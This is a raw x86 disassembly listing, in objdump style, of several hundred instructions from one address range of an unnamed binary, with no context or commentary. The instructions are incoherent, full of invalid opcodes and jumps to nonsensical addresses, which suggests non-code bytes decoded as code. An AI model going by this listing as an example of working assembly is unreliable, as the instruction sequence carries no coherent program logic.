  417db1:	arpl   sp,sp
  417db3:	ins    DWORD PTR es:[edi],dx
  417db4:	jns    0x417d58
  417db6:	fwait
  417db7:	js     0x417dcd
  417db9:	scas   eax,DWORD PTR es:[edi]
  417dba:	imul   ecx,eax,0x7f
  417dbd:	fst    DWORD PTR [ebp+0x11e88fbe]
  417dc3:	pop    ecx
  417dc4:	cs add eax,0xd4d2fdb6
  417dca:	fstp   TBYTE PTR [eax-0x34]
  417dcd:	(bad)  [esi]
  417dcf:	push   ss
  417dd0:	mov    esp,0xedb23bca
  417dd5:	xchg   ecx,eax
  417dd6:	aam    0xa
  417dd8:	jnp    0x417d91
  417dda:	fstp   TBYTE PTR [edi-0x31319eb3]
  417de0:	pop    ss
  417de1:	dec    ebp
  417de2:	push   0xffffffa6
  417de4:	sub    ah,BYTE PTR [edx+0x54d56d85]
  417dea:	ret    0x4486
  417ded:	ficom  DWORD PTR ds:0x939ee53f
  417df4:	mov    bh,0x42
  417df6:	mov    al,0x67
  417df8:	mov    al,BYTE PTR [ebp-0x7e20e5b4]
  417dfe:	mov    esi,0x7e873c8c
  417e03:	(bad)  
  417e04:	es dec eax
  417e06:	jae    0x417e3e
  417e08:	jae    0x417e1d
  417e0a:	inc    esi
  417e0b:	(bad)  
  417e0c:	enter  0x4d2,0xe0
  417e10:	loopne 0x417e8a
  417e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e13:	retf   
  417e14:	fst    QWORD PTR [edx-0x8]
  417e17:	xor    ecx,DWORD PTR [ebp-0xca0e4b4]
  417e1d:	adc    ebx,DWORD PTR [ebx]
  417e1f:	push   eax
  417e20:	adc    DWORD PTR [esp+ebx*2-0x65571786],ebx
  417e27:	add    BYTE PTR [edi+0x41d5f6c0],ch
  417e2d:	(bad)  
  417e2e:	arpl   WORD PTR [ecx+0x4e],bx
  417e31:	sti    
  417e32:	xchg   edx,eax
  417e33:	out    0xdb,al
  417e35:	sub    BYTE PTR [eax+edi*1],al
  417e38:	in     al,0x9f
  417e3a:	adc    al,0xdf
  417e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e3d:	mov    edi,0x658cc4d1
  417e42:	mov    edx,0x26e948e
  417e47:	adc    ebx,DWORD PTR [edx-0x46]
  417e4a:	jmp    0x417e6c
  417e4c:	inc    esi
  417e4d:	sbb    eax,0xbc91334
  417e52:	or     eax,0x584b13e
  417e57:	dec    ecx
  417e58:	out    0x3a,eax
  417e5a:	scas   al,BYTE PTR es:[edi]
  417e5b:	mov    ebx,0xeee24134
  417e60:	dec    edi
  417e61:	fmul   DWORD PTR [edx-0x4dfdedf4]
  417e67:	dec    ebx
  417e68:	daa    
  417e69:	or     eax,0xf2e56160
  417e6e:	mov    ds:0x4ff83d1e,eax
  417e73:	sbb    eax,edx
  417e75:	mov    edx,0xac015912
  417e7a:	je     0x417e26
  417e7c:	mov    al,0x85
  417e7e:	dec    edi
  417e7f:	stos   DWORD PTR es:[edi],eax
  417e80:	xchg   esi,eax
  417e81:	inc    ebx
  417e82:	cs add eax,0xc5c8b5a8
  417e88:	inc    ecx
  417e89:	mov    ds:0x240d3831,al
  417e8e:	cwde   
  417e8f:	inc    ecx
  417e90:	stos   BYTE PTR es:[edi],al
  417e91:	dec    edi
  417e92:	fistp  WORD PTR [edi-0x4e0869c9]
  417e98:	rcr    BYTE PTR [esi],1
  417e9a:	sub    al,0x27
  417e9c:	rcr    DWORD PTR [esi+0x4c966f01],cl
  417ea2:	outs   dx,DWORD PTR ds:[esi]
  417ea3:	mov    bh,0xf6
  417ea5:	or     bl,0xc1
  417ea8:	xor    DWORD PTR [ebp-0x6d],ebx
  417eab:	lahf   
  417eac:	cmc    
  417ead:	xchg   edx,eax
  417eae:	ds add al,0xc7
  417eb1:	xor    BYTE PTR [ebx+0x6f],bh
  417eb4:	sbb    DWORD PTR [eax+0x6d610444],esi
  417eba:	add    DWORD PTR [edi+0x44],ebp
  417ebd:	pop    ebx
  417ebe:	popa   
  417ebf:	cmp    DWORD PTR [ebx-0x2058c429],ebx
  417ec5:	jge    0x417f18
  417ec7:	pop    es
  417ec8:	mov    al,0xee
  417eca:	push   ebx
  417ecb:	sti    
  417ecc:	adc    edx,DWORD PTR [eax-0xe]
  417ecf:	mov    al,ds:0xebc680d6
  417ed4:	and    BYTE PTR [eax+0x42ad875b],dl
  417eda:	push   edx
  417edb:	popa   
  417edc:	pop    esi
  417edd:	(bad)  
  417ede:	jb     0x417ea3
  417ee0:	scas   eax,DWORD PTR es:[edi]
  417ee1:	or     eax,0x6d1bdfb7
  417ee6:	enter  0x8c47,0xe4
  417eea:	movlhps xmm1,xmm3
  417eed:	pop    esi
  417eee:	pop    ecx
  417eef:	outs   dx,DWORD PTR ds:[esi]
  417ef0:	and    al,0xe5
  417ef2:	std    
  417ef3:	or     eax,edx
  417ef5:	and    dl,BYTE PTR [edx+0x2f]
  417ef8:	ror    BYTE PTR [edx-0x889d0f1],0x5b
  417eff:	retf   
  417f00:	push   0x4b
  417f02:	jle    0x417f49
  417f04:	inc    ebp
  417f05:	std    
  417f06:	aaa    
  417f07:	or     al,0x32
  417f09:	outs   dx,DWORD PTR ds:[esi]
  417f0a:	jb     0x417f71
  417f0c:	call   FWORD PTR [esi-0x7b]
  417f0f:	or     DWORD PTR [di-0x7f],edx
  417f13:	push   edx
  417f14:	sahf   
  417f15:	fprem  
  417f17:	cdq    
  417f18:	rcl    BYTE PTR [edx+0x21c934c8],cl
  417f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f1f:	lods   eax,DWORD PTR ds:[esi]
  417f20:	or     DWORD PTR [ebx+0x52],edx
  417f23:	adc    BYTE PTR [ebx-0x6afe1693],bl
  417f29:	push   0xffffffbf
  417f2b:	lods   eax,DWORD PTR ds:[esi]
  417f2c:	ret    
  417f2d:	mov    edx,0x274bbf23
  417f32:	rcr    BYTE PTR [ecx-0x34b0b2bd],cl
  417f38:	ffreep st(6)
  417f3a:	(bad)  
  417f3b:	sub    ah,BYTE PTR [ebx-0x765e6a12]
  417f41:	int    0x40
  417f43:	pop    ebp
  417f44:	dec    esp
  417f45:	aad    0x4d
  417f47:	rcr    cl,1
  417f49:	repnz sti 
  417f4b:	jnp    0x417eda
  417f4d:	mov    ebp,0xd3f52758
  417f52:	cmp    BYTE PTR [ecx],al
  417f54:	push   ss
  417f55:	lea    eax,[ecx]
  417f57:	mov    edx,0xe8824c14
  417f5c:	pop    ebp
  417f5d:	mov    edi,0x2730d6d3
  417f62:	pop    ecx
  417f63:	scas   al,BYTE PTR es:[edi]
  417f64:	inc    eax
  417f65:	retf   0x2325
  417f68:	add    al,0x79
  417f6a:	fbstp  TBYTE PTR [ecx]
  417f6c:	xor    ebx,DWORD PTR ds:0xab8bf471
  417f72:	push   ebp
  417f73:	ins    BYTE PTR es:[edi],dx
  417f74:	mul    BYTE PTR [esp-0x12729fcf]
  417f7b:	aad    0xe5
  417f7d:	icebp  
  417f7e:	pop    eax
  417f7f:	in     eax,0x5c
  417f81:	or     DWORD PTR [esi+ebp*4-0x29622316],ebx
  417f88:	sub    bh,BYTE PTR [ecx]
  417f8a:	mov    eax,ds:0xcf11b3e5
  417f8f:	fwait
  417f90:	int3   
  417f91:	inc    esp
  417f92:	imul   esi,DWORD PTR [eax-0x1eb67822],0xfffffffb
  417f99:	in     al,dx
  417f9a:	fdiv   DWORD PTR [ebp+0x29c918bb]
  417fa0:	xlat   BYTE PTR ds:[ebx]
  417fa1:	add    DWORD PTR [esi+0x9],edx
  417fa4:	test   al,0xba
  417fa6:	inc    ebp
  417fa7:	pop    ds
  417fa8:	imul   ebp,esp
  417fab:	xchg   edi,eax
  417fac:	adc    BYTE PTR [esi+0x58],al
  417faf:	xchg   edi,eax
  417fb0:	data16 jb 0x417f7c
  417fb3:	mov    bl,0x22
  417fb5:	iret   
  417fb6:	dec    eax
  417fb7:	fistp  QWORD PTR [ebp-0x5c]
  417fba:	fwait
  417fbb:	push   ebp
  417fbc:	fldcw  WORD PTR [ebp+0x24d8cddf]
  417fc2:	cmp    ecx,DWORD PTR [edx]
  417fc4:	sbb    eax,0x1d097e67
  417fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fca:	jns    0x417fff
  417fcc:	mov    ecx,0x20c9a096
  417fd1:	mov    esp,0xae5dd715
  417fd6:	sahf   
  417fd7:	(bad)  
  417fd8:	sbb    BYTE PTR [ebx+ebp*1+0x41c8f4b6],ch
  417fdf:	jmp    0x417fe5
  417fe1:	ja     0x418019
  417fe3:	push   ds
  417fe4:	jno    0x417f83
  417fe6:	fmul   QWORD PTR [ebp+0x26]
  417fe9:	push   0xe
  417feb:	and    ebx,edx
  417fed:	stos   DWORD PTR es:[edi],eax
  417fee:	pop    edx
  417fef:	add    edx,DWORD PTR [edx-0x9e962e3]
  417ff5:	jnp    0x41802b
  417ff7:	addr16 jmp 0x3352e24
  417ffd:	loopne 0x41800c
  417fff:	mov    edi,0x3bc5a8b1
  418004:	cmc    
  418005:	dec    edi
  418006:	call   0xa6b7beef
  41800b:	pop    ds
  41800c:	leave  
  41800d:	sbb    DWORD PTR [eax+0x704007f5],0x7a
  418014:	add    eax,DWORD PTR [ebp+0x57edce94]
  41801a:	pusha  
  41801b:	data16 jno 0x41803a
  41801e:	call   0xcdd106d3
  418023:	xor    ebp,edi
  418025:	mov    ebx,0x2154ad69
  41802a:	hlt    
  41802b:	add    eax,0xf400837f
  418030:	fs mov ebx,0x3901c17a
  418036:	inc    esi
  418037:	fsub   st,st(3)
  418039:	call   0x3bf0da17
  41803e:	rcl    dl,cl
  418040:	add    ecx,DWORD PTR [esi]
  418042:	cmp    ah,BYTE PTR [edx-0x3c]
  418045:	(bad)  
  418046:	sti    
  418047:	mov    edx,0xa0a58089
  41804c:	adc    BYTE PTR [ebp-0x3c9ce901],al
  418052:	or     DWORD PTR ds:0x302ac96a,esp
  418058:	int3   
  418059:	push   ebx
  41805a:	outs   dx,BYTE PTR ds:[esi]
  41805b:	repnz or BYTE PTR [esi-0x5d],ch
  41805f:	ret    0x30fb
  418062:	leave  
  418063:	xchg   BYTE PTR ds:0x6d49e7b0,ah
  418069:	dec    ebp
  41806a:	les    esi,FWORD PTR [edi]
  41806c:	dec    BYTE PTR [ecx+edi*1]
  41806f:	arpl   WORD PTR [ebx],bx
  418071:	xor    eax,0x61023ad6
  418076:	ds cli 
  418078:	rcl    ch,1
  41807a:	sahf   
  41807b:	xchg   BYTE PTR [esi+ecx*1-0x11],ch
  41807f:	lock jo 0x41808a
  418082:	jmp    0x60be:0xaeb86414
  418089:	popf   
  41808a:	mov    edx,0x21b30c3a
  41808f:	pop    es
  418090:	fstp   DWORD PTR [ecx]
  418092:	dec    eax
  418093:	jmp    0x4180f2
  418095:	test   eax,0x7f779f92
  41809a:	push   0x1d
  41809c:	push   ds
  41809d:	int    0xe7
  41809f:	shr    BYTE PTR [ebx],1
  4180a1:	sub    DWORD PTR [eax-0x5b],edi
  4180a4:	sbb    al,0xd4
  4180a6:	xchg   esi,edi
  4180a8:	arpl   WORD PTR [ebx-0x70],ax
  4180ab:	imul   esp,DWORD PTR ds:0x657fa9f4,0xd1f0829f
  4180b5:	jecxz  0x4180d6
  4180b7:	xchg   edx,eax
  4180b8:	push   ds
  4180b9:	jbe    0x41809a
  4180bb:	and    al,0xa8
  4180bd:	dec    ebx
  4180be:	mov    bl,0xe2
  4180c1:	mov    al,0xc9
  4180c3:	push   edx
  4180c4:	cmp    BYTE PTR [eax],bl
  4180c6:	dec    esp
  4180c7:	push   eax
  4180c8:	imul   edi,ecx,0x84c83663
  4180ce:	sbb    ch,cl
  4180d0:	test   al,0x5
  4180d2:	(bad)  
  4180d3:	mov    ah,0xec
  4180d5:	sub    al,0x7e
  4180d7:	xor    DWORD PTR ds:[ebp-0x5b],0x7c
  4180dc:	iret   
  4180dd:	dec    edx
  4180de:	xor    al,0xb1
  4180e0:	mov    al,0x48
  4180e2:	mov    al,0x98
  4180e4:	pop    es
  4180e5:	lods   eax,DWORD PTR ds:[esi]
  4180e6:	out    dx,al
  4180e7:	pop    edx
  4180e8:	push   esp
  4180e9:	mov    dl,BYTE PTR [edx+0x53]
  4180ec:	loop   0x4180c2
  4180ee:	push   ebx
  4180ef:	pushf  
  4180f0:	popf   
  4180f1:	fiadd  DWORD PTR [ebp+edi*1+0x623e44b8]
  4180f8:	mov    ebp,0x730cbf59
  4180fd:	cmp    eax,0x1bfc6a7b
  418102:	lea    ebp,[ecx]
  418104:	sbb    ebp,ebp
  418106:	out    dx,al
  418107:	xlat   BYTE PTR ds:[ebx]
  418108:	lods   al,BYTE PTR ds:[esi]
  418109:	mov    cl,0xcd
  41810b:	(bad)  
  41810c:	shl    DWORD PTR [edi-0x7f],1
  41810f:	jne    0x418143
  418111:	xor    ah,dh
  418113:	sbb    ecx,DWORD PTR [ebp+0x332196e7]
  418119:	aaa    
  41811a:	rcl    BYTE PTR [edx+0x5e],1
  41811d:	xchg   ebx,eax
  41811e:	das    
  41811f:	aas    
  418120:	sbb    DWORD PTR [eax+edx*2],ebx
  418123:	inc    ecx
  418124:	sub    al,0x4f
  418126:	lods   al,BYTE PTR ds:[esi]
  418127:	or     ebx,DWORD PTR [ebp+0x0]
  41812a:	ins    DWORD PTR es:[edi],dx
  41812b:	imul   ecx,eax,0x77
  41812e:	inc    esi
  41812f:	mov    eax,0x6598fdb1
  418134:	mov    ebp,esi
  418136:	popf   
  418137:	pop    edx
  418138:	xchg   edi,eax
  418139:	pop    esp
  41813a:	jmp    0xaadf3c5c
  41813f:	sbb    BYTE PTR [edi-0xb5a37df],al
  418145:	nop
  418146:	and    DWORD PTR [ebp-0x502586c0],0x7b1c33d7
  418150:	inc    esp
  418151:	add    esp,DWORD PTR [edi-0x29c0e23b]
  418157:	adc    esp,ecx
  418159:	push   0x9889e670
  41815e:	cwde   
  41815f:	mov    DWORD PTR [edi+0x4a3bfe24],esi
  418165:	cmp    al,0xf7
  418167:	enter  0x87b9,0x8a
  41816b:	ins    DWORD PTR es:[edi],dx
  41816c:	pop    edx
  41816d:	and    eax,0xd0c01291
  418172:	jp     0x41815b
  418174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418175:	ja     0x4181b3
  418177:	push   es
  418178:	ins    DWORD PTR es:[edi],dx
  418179:	jb     0x418113
  41817b:	inc    esi
  41817c:	in     eax,0x75
  41817e:	mov    esi,0x7dec0097
  418183:	mov    edx,0x6d0acdd9
  418188:	ds stos BYTE PTR es:[edi],al
  41818a:	xchg   ebp,eax
  41818b:	jmp    0xc16248b3
  418190:	mov    ah,0xf1
  418192:	jo     0x4181eb
  418194:	or     BYTE PTR [eax+ecx*8],bl
  418197:	push   0xf0d332ba
  41819c:	sub    DWORD PTR [edi+0x3dafb9a6],ecx
  4181a2:	pop    esi
  4181a3:	(bad)  
  4181a4:	jb     0x4181aa
  4181a6:	pop    ebx
  4181a7:	fistp  WORD PTR [edi+0x491eff5a]
  4181ad:	jmp    0xeca6e5ff
  4181b2:	pusha  
  4181b3:	out    0xe1,eax
  4181b5:	neg    BYTE PTR [edi+0x4b]
  4181b8:	xchg   esp,eax
  4181b9:	push   0x2cbec207
  4181be:	std    
  4181bf:	sar    DWORD PTR [eax+0x21],cl
  4181c2:	shl    BYTE PTR [ecx-0x445204ad],cl
  4181c8:	lahf   
  4181c9:	icebp  
  4181ca:	imul   esp,DWORD PTR [edx+0x526530a7],0x4b
  4181d1:	xor    eax,0x572db79d
  4181d6:	fistp  DWORD PTR [esi+0x6d]
  4181d9:	out    0x23,al
  4181db:	fcom   DWORD PTR ds:0x91ecb94
  4181e1:	in     al,0xe7
  4181e3:	inc    ebx
  4181e4:	das    
  4181e5:	mov    ecx,0xc5842cee
  4181ea:	jns    0x4181ec
  4181ec:	and    cl,ah
  4181ee:	adc    al,0x1
  4181f0:	test   eax,0xa425c6d4
  4181f5:	call   0x6e87fe9
  4181fa:	mov    ebx,0x7a13589b
  4181ff:	push   es
  418200:	and    bh,al
  418202:	out    dx,al
  418203:	and    eax,0x1e1cae4c
  418208:	xor    al,0xa4
  41820a:	and    dh,al
  41820c:	cmp    eax,0x35cf15df
  418211:	lock clc 
  418213:	cmp    esp,edx
  418215:	imul   edx,esi,0xfffffff1
  418218:	add    DWORD PTR [edx],ebx
  41821a:	shl    DWORD PTR [edx+0xb],cl
  41821d:	mov    ds:0x5d27d171,eax
  418222:	mov    edi,0x5d43a865
  418227:	inc    edi
  418228:	jg     0x418287
  41822a:	dec    esi
  41822b:	loope  0x4181b6
  41822d:	cmc    
  41822e:	in     al,0xa6
  418230:	cs aad 0x88
  418233:	or     BYTE PTR [edi+ebp*1-0x1ec7ad60],ch
  41823a:	sbb    al,0xba
  41823c:	fs imul edi,esp,0xa538bac9
  418243:	push   0xffffff9b
  418245:	outs   dx,DWORD PTR ds:[esi]
  418246:	outs   dx,BYTE PTR ds:[esi]
  418247:	cmp    edx,edi
  418249:	iret   
  41824a:	jl     0x41820d
  41824c:	inc    esi
  41824d:	aas    
  41824e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418250:	jmp    DWORD PTR [ebx]
  418252:	(bad)  
  418253:	fist   WORD PTR [edx]
  418255:	and    dh,BYTE PTR [ebx-0x45]
  418258:	sbb    BYTE PTR [esi+edi*4-0x1f2e964d],ch
  41825f:	jns    0x418254
  418261:	mov    ebx,0xb13aee2a
  418266:	(bad)  
  418267:	leave  
  418268:	xchg   esp,eax
  418269:	or     bh,bh
  41826b:	cli    
  41826c:	xchg   esi,eax
  41826d:	mov    ah,0x10
  41826f:	or     esp,ebp
  418271:	ja     0x418231
  418273:	add    ah,dl
  418275:	mov    cl,BYTE PTR [eax+0x3bd9a44a]
  41827b:	push   es
  41827c:	and    al,0x7f
  41827e:	(bad)  
  41827f:	sub    DWORD PTR [edi],ebx
  418281:	(bad)  
  418282:	mov    esi,0x169acf79
  418287:	xchg   edi,eax
  418288:	mov    eax,fs:0x3bf23aa6
  41828e:	pop    eax
  41828f:	mov    ah,0x8e
  418291:	inc    eax
  418292:	sar    BYTE PTR [ebp+ecx*8-0xdf9ebee],0xa9
  41829a:	jns    0x41825b
  41829c:	push   0xffffffd2
  41829e:	sbb    DWORD PTR [ebp-0x1b],esi
  4182a1:	call   0x92eb:0xebe28395
  4182a8:	cdq    
  4182a9:	div    BYTE PTR [eax+ebx*2-0x4823e9a8]
  4182b0:	xchg   esi,eax
  4182b1:	sbb    esp,edi
  4182b3:	and    edx,esp
  4182b5:	stos   BYTE PTR es:[edi],al
  4182b6:	pop    edx
  4182b7:	mov    DWORD PTR [esi+eax*4-0x4e],edi
  4182bb:	cli    
  4182bc:	push   eax
  4182bd:	add    BYTE PTR [esi+0x6c1a533c],bl
  4182c3:	and    al,0x9
  4182c5:	or     bl,BYTE PTR [ebp+0x5d]
  4182c8:	add    al,0x36
  4182ca:	jl     0x418274
  4182cc:	mov    ds:0x2cfdbf9c,al
  4182d1:	push   edx
  4182d2:	imul   ebx,DWORD PTR [edi-0x3f],0xffffffa8
  4182d6:	je     0x41826c
  4182d8:	idiv   bh
  4182da:	call   0x7e9db0c0
  4182df:	outs   dx,DWORD PTR ds:[esi]
  4182e0:	push   0xec0484dd
  4182e5:	xchg   edx,eax
  4182e6:	dec    ebp
  4182e7:	je     0x41826b
  4182e9:	xor    eax,0xd5a1c99f
  4182ee:	(bad)  
  4182ef:	jb     0x4182c4
  4182f1:	sbb    al,0x3a
  4182f3:	out    0xe8,al
  4182f5:	int3   
  4182f6:	mov    eax,ds:0xcecc9dfc
  4182fb:	fstp   DWORD PTR ds:0xcc03e276
  418301:	aas    
  418302:	shr    DWORD PTR [esp+eax*4-0x14],1
  418306:	fldenv [esi+0x74ab325b]
  41830c:	aam    0x93
  41830e:	xchg   DWORD PTR [ebx],esp
  418310:	test   DWORD PTR [edx],esp
  418312:	jl     0x4182b7
  418314:	mov    cl,0x69
  418316:	pop    ds
  418317:	jge    0x41837b
  418319:	pop    ebx
  41831a:	jp     0x41837a
  41831c:	push   esp
  41831d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831e:	in     eax,0xf6
  418320:	dec    ecx
  418321:	inc    esi
  418322:	mov    ds:0xbbbe0745,eax
  418327:	addr16 jmp 0xc978:0x285c2733
  41832f:	add    cl,ah
  418331:	xlat   BYTE PTR ds:[ebx]
  418332:	jno    0x4182e6
  418334:	mov    fs,WORD PTR ds:0x4eda8d58
  41833a:	jmp    0xf5f0:0xa48aa3c2
  418341:	xchg   ebx,eax
  418342:	pusha  
  418343:	js     0x41834d
  418345:	cmc    
  418346:	push   0x137e0daa
  41834b:	add    eax,0x4b1933f2
  418350:	jmp    0xf1710d81
  418355:	test   ch,ah
  418357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418358:	sbb    DWORD PTR [esi],0xbe80be17
  41835e:	fiadd  DWORD PTR [edx-0x4eb7d99d]
  418364:	pop    ds
  418365:	xchg   BYTE PTR [eax-0x1b],cl
  418368:	or     edx,esp
  41836a:	(bad)  [ebx-0x1a]
  41836d:	sbb    al,0x14
  41836f:	inc    esp
  418370:	dec    esi
  418371:	hlt    
  418372:	pop    DWORD PTR [eax+0x6d2196f5]
  418378:	inc    ebx
  418379:	push   0x185b0caf
  41837e:	mov    edi,0x6974a965
  418383:	mov    ebp,gs
  418385:	addr16 jmp 0x6d22:0xa48ace34
  41838d:	idiv   dh
  41838f:	sbb    ebx,DWORD PTR [ecx*8-0x28b9c932]
  418396:	mov    edi,0x277bb785
  41839b:	leave  
  41839c:	mov    al,0x2f
  41839e:	dec    esp
  41839f:	and    BYTE PTR [esp+esi*8+0x4d34ca8a],bl
  4183a6:	cmp    dl,bh
  4183a8:	dec    esp
  4183a9:	jp     0x4183d5
  4183ab:	pop    eax
  4183ac:	dec    BYTE PTR cs:[ebx+ecx*8-0x5a]
  4183b1:	jbe    0x41842f
  4183b3:	enter  0xb8f3,0xeb
  4183b7:	or     al,0x40
  4183b9:	comiss xmm6,xmm4
  4183bc:	push   eax
  4183bd:	mov    esp,0x65f48ec8
  4183c2:	cmc    
  4183c3:	push   0x15c5f291
  4183c8:	xor    BYTE PTR [edx+edx*2-0x19],ch
  4183cc:	int    0x52
  4183ce:	dec    eax
  4183cf:	lods   eax,DWORD PTR ds:[esi]
  4183d0:	neg    DWORD PTR [edx]
  4183d2:	pop    ecx
  4183d3:	jne    0x4183df
  4183d5:	xlat   BYTE PTR ds:[ebx]
  4183d6:	xchg   ebx,eax
  4183d7:	mov    cl,0x7a
  4183d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183da:	das    
  4183db:	stos   BYTE PTR es:[edi],al
  4183dc:	mov    ds:0xaf267ca6,eax
  4183e1:	inc    ecx
  4183e2:	pop    eax
  4183e3:	cmp    esi,DWORD PTR [ebp-0x35e1f419]
  4183e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ea:	sbb    BYTE PTR [eax-0x493ac330],0xeb
  4183f1:	mov    al,ds:0x723d4c1e
  4183f6:	aas    
  4183f7:	imul   esp,DWORD PTR [edx+0x2670328e],0x2b4dd65d
  418401:	or     al,0xe8
  418403:	add    eax,0xdd652049
  418408:	push   cs
  418409:	in     eax,0x59
  41840b:	or     cl,BYTE PTR [esi+0x1bb007b9]
  418411:	jo     0x418478
  418413:	or     ah,BYTE PTR [edi]
  418415:	cmp    bh,BYTE PTR [edi+0x33]
  418418:	test   al,0x42
  41841a:	jnp    0x4183e5
  41841c:	push   ecx
  41841d:	repnz mov al,0xf5
  418420:	pop    edi
  418421:	rcr    DWORD PTR [eax-0x396fac6f],1
  418427:	(bad)  
  418428:	inc    BYTE PTR [esp+ebp*2-0x16]
  41842c:	shl    DWORD PTR [ebx+0x4e],0x6f
  418430:	push   cs
  418431:	cmc    
  418432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418433:	jne    0x4183c7
  418435:	(bad)  
  418436:	cwde   
  418437:	retf   
  418438:	push   eax
  418439:	push   edx
  41843a:	xchg   edx,eax
  41843b:	sbb    al,0x19
  41843d:	mov    ch,0x75
  41843f:	aaa    
  418440:	sub    edx,esi
  418442:	outs   dx,BYTE PTR ds:[esi]
  418443:	xchg   ebx,eax
  418444:	mov    ebx,0xa7cc9ef3
  418449:	xchg   DWORD PTR [ecx*4+0x1d15f0ec],edx
  418450:	xchg   ecx,eax
  418451:	cmc    
  418452:	adc    ch,BYTE PTR [edi-0x3224b47b]
  418458:	jno    0x4184c0
  41845a:	push   cs
  41845b:	pop    es
  41845c:	(bad)  
  41845d:	fidiv  WORD PTR [ebp+0xbb3d915]
  418463:	mov    ebp,DWORD PTR [edi-0x36]
  418466:	mov    edi,0x9ee83883
  41846b:	(bad)
  41846e:	xor    DWORD PTR [eax+eiz*2-0x3b],0x14
  418473:	sub    al,0x53
  418475:	push   esp
  418476:	in     al,dx
  418477:	xlat   BYTE PTR es:[ebx]
  418479:	xor    bh,dl
  41847b:	mov    eax,ds:0x1aabe39c
  418480:	adc    DWORD PTR [eax-0x4a],esi
  418483:	adc    eax,0x87e3ccc4
  418488:	xchg   esi,eax
  418489:	mov    ds:0x4b5d69d1,eax
  41848e:	(bad)  
  41848f:	sbb    eax,0xa6f3d6ab
  418494:	in     eax,dx
  418495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418496:	stos   DWORD PTR es:[edi],eax
  418497:	push   edi
  418498:	and    ch,bl
  41849a:	int    0x67
  41849c:	sbb    DWORD PTR [ebp+0x4ce46508],ecx
  4184a2:	or     ebx,ebx
  4184a4:	jg     0x41845c
  4184a6:	popf   
  4184a7:	mov    ebx,0xbf3e1d29
  4184ac:	cdq    
  4184ad:	out    dx,eax
  4184ae:	and    dl,dl
  4184b0:	outs   dx,BYTE PTR ds:[esi]
  4184b1:	test   DWORD PTR [ebp+0x62],ecx
  4184b4:	enter  0x207f,0x30
  4184b8:	mov    ds:0xa53fd31,eax
  4184bd:	sbb    DWORD PTR [esi-0x4d17ef8c],ebp
  4184c3:	nop
  4184c4:	mov    dh,0x45
  4184c6:	mov    DWORD PTR [esp+eax*1-0x44846ddd],0xc11a46fb
  4184d1:	push   ebx
  4184d2:	jmp    0xbc7fc949
  4184d7:	inc    eax
  4184d8:	test   al,bh
  4184da:	inc    edi
  4184db:	je     0x4184c5
  4184dd:	jno    0x41853e
  4184df:	stos   DWORD PTR es:[edi],eax
  4184e0:	stos   DWORD PTR es:[edi],eax
  4184e1:	rcl    ebp,cl
  4184e3:	cwde   
  4184e4:	sbb    ebp,eax
  4184e6:	pop    ebp
  4184e7:	inc    ecx
  4184e8:	das    
  4184e9:	scas   al,BYTE PTR es:[edi]
  4184ea:	daa    
  4184eb:	icebp  
  4184ec:	jb     0x4184fb
  4184ee:	(bad)  
  4184ef:	push   edi
  4184f0:	lds    edx,FWORD PTR [ebx+eiz*2-0xb9d1044]
  4184f7:	cmp    edi,DWORD PTR [ebx-0x75]
  4184fa:	and    edx,edx
  4184fc:	dec    DWORD PTR [edi]
  4184fe:	mov    BYTE PTR [esi-0x664fab82],ah
  418504:	fcom   QWORD PTR [esi-0x4f018355]
  41850a:	in     al,dx
  41850b:	cdq    
  41850c:	push   0x9c37350d
  418511:	popa   
  418512:	cmp    al,BYTE PTR [ebp*2-0x72a3a80e]
  418519:	inc    esp
  41851a:	ror    DWORD PTR [edi-0x51920e13],0xb4
  418521:	(bad)  ds:0x7f69224d
  418527:	rol    cl,cl
  418529:	push   ebp
  41852a:	xchg   ecx,eax
  41852b:	retf   
  41852c:	mov    ecx,gs
  41852e:	cmp    esp,DWORD PTR [ecx-0x67]
  418531:	rcl    BYTE PTR [ebp+0x7aeb344c],cl
  418537:	icebp  
  418538:	inc    ebx
  418539:	lea    ebx,[ecx+0x9dcb192]
  41853f:	xchg   esp,eax
  418540:	sub    esi,DWORD PTR [esi-0x4d]
  418543:	mov    ds:0xffb52617,eax
  418548:	pop    esi
  418549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854a:	pop    esi
  41854b:	(bad)  [esi]
  41854d:	loop   0x418590
  41854f:	ds pop edi
  418551:	bound  edi,QWORD PTR [ecx+0x7c8dc7a7]
  418557:	mov    edi,0xe576e9fa
  41855c:	xchg   esp,eax
  41855d:	jns    0x4185a8
  41855f:	push   ebx
  418560:	hlt    
  418561:	stc    
  418562:	pusha  
  418563:	int3   
  418564:	mov    ch,0xd4
  418566:	sbb    ah,BYTE PTR [esi-0x18]
  418569:	mov    ch,0xfb
  41856b:	xchg   edx,eax
  41856c:	sbb    DWORD PTR ds:0xbe19895f,0x30
  418573:	ja     0x418525
  418575:	mov    al,0x50
  418577:	inc    edi
  418578:	or     edx,DWORD PTR ds:0xd4ec7259
  41857e:	jl     0x41857c
  418580:	lods   al,BYTE PTR ds:[esi]
  418581:	pop    edx
  418582:	aad    0xaa
  418584:	cmp    eax,0xf190b4e6
  418589:	xchg   ecx,eax
  41858a:	cs dec ebp
  41858c:	dec    edx
  41858d:	test   DWORD PTR [edx-0xf9a1109],esp
  418593:	adc    bl,bl
  418595:	add    al,0xf4
  418597:	xor    eax,0xc17495ac
  41859c:	loopne 0x418570
  41859e:	cs loop 0x4185c3
  4185a1:	mov    edx,0x8fdfe15e
  4185a6:	sbb    bl,ah
  4185a8:	call   0xb08d94b0
  4185ad:	add    bh,dh
  4185af:	jmp    DWORD PTR [ebp+0x28]
  4185b2:	loop   0x4185e1
  4185b4:	jno    0x41853a
  4185b6:	(bad)  
  4185b7:	loop   0x4185cc
